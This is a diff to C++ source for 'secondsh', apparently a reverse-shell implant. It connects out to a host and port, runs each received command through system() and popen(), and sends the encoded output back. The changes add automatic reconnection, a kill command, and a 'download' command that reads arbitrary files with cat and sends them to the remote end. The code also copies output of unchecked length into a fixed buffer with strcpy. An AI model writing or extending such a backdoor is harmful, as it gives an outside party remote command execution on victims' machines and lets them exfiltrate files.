@@ -9,6 +9,7 @@
 #include <sys/time.h>
 #include <thread>
 #include <map>
+#include <signal.h>
 
 //NETWORKING
 #include <unistd.h>
@@ -19,14 +20,14 @@
 #include <arpa/inet.h>
 #include <netdb.h>
 
-// theres a limit about how much memory you can access, buffer size is only 1500
+#define BUFFER_SIZE 4096
 
 struct secondsh{
-    int bytes_red = 0;
-    int bytes_written = 0;
-    int global_socket;
+    int bytes_red = (int) NULL;
+    int bytes_written = (int) NULL;
+    int global_socket = (int) NULL;
 
-    unsigned int PORT_;
+    unsigned int PORT_ = (int) NULL;
     std::string hostname_;
 
     std::string alphabet = "abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
@@ -83,14 +84,14 @@ struct secondsh{
     std::string system_output(std::string cmd) {
         std::string data;
         FILE * stream;
-        const int max_buffer = 256;
-        char buffer[max_buffer];
+
+        char buffer[BUFFER_SIZE];
         cmd.append(" 2>&1");
 
         stream = popen(cmd.c_str(), "r");
         if (stream){
         while (!feof(stream)){
-            if(fgets(buffer, max_buffer, stream) != NULL){ data.append(buffer);}
+            if(fgets(buffer, BUFFER_SIZE, stream) != NULL){ data.append(buffer);}
         }
         pclose(stream);
             
@@ -99,11 +100,13 @@ struct secondsh{
  
     }
 
+
     int* connect_socket(unsigned int PORT, const std::string hostname){
+        signal(SIGPIPE, SIG_IGN); // used to handle SIGPIPE, if not ignored it crashes
         PORT_ = PORT;
         hostname_ = hostname;
 
-        char buffer[1500];
+        char buffer[BUFFER_SIZE];
 
         struct hostent* host = gethostbyname(hostname.c_str()); 
         sockaddr_in send_sock_addr;   
@@ -140,14 +143,14 @@ struct secondsh{
         std::string current_dir = ncrypt(system_output("echo $PWD"));
         memset(&buffer, 0x00, sizeof(buffer));
         strcpy(buffer, current_dir.c_str());
-        bytes_written += send(client_sd, (char*)&buffer, strlen(buffer), 0); //sending current_dir
+        bytes_written += send(client_sd, (char*)&buffer, strlen(buffer), 0); // sending current_dir
 
         return ptr_clientsd;
 
     }
 
-    void connectsh(int* socket){
-        char buffer[1500];
+    void connectsh(){
+        char buffer[BUFFER_SIZE];
         
         while(true){
             memset(&buffer, 0x00, sizeof(buffer));
@@ -166,12 +169,40 @@ struct secondsh{
             if(read < 0){
                 printf("recv error: %s\n", strerror(errno));
             }
-
+            // disconnect from socket (but secondsh is still on)
             else if(!strcmp(buffer, "disconnect")){
-                close(global_socket);
-                exit(0);
+                close(global_socket); // close socket
+                
+                std::chrono::seconds duration(2);
+                std::this_thread::sleep_for(duration);
+
+                // reset variables
+                unsigned int temp_port = PORT_;
+                std::string temp_hostname = hostname_;
+                
+                bytes_red = (int) NULL;
+                bytes_written = (int) NULL;
+                global_socket = (int) NULL;
+                PORT_ = (int) NULL;
+                hostname_ = "";
+
+                // restart socket
+                connect_socket(temp_port, temp_hostname);
+                connectsh();
             }
-            
+            // (stop process) secondsh exits
+            else if(!strcmp(buffer, "stoprocess")){
+                close(global_socket);
+                exit(1);
+            }
+
+            else if(token == "download"){
+                std::string file = s_buffer.substr(9, s_buffer.length());
+                std::string c = "cat " + file;
+                std::string out = system_output(c);
+                strcpy(buffer, ncrypt(out).c_str());
+                bytes_written += send(global_socket, (char*)&buffer, strlen(buffer)+1, 0);
+            }
             system(buffer);
             std::string cmd_out = system_output(std::string(buffer));
             std::string crypt_out = ncrypt(cmd_out);
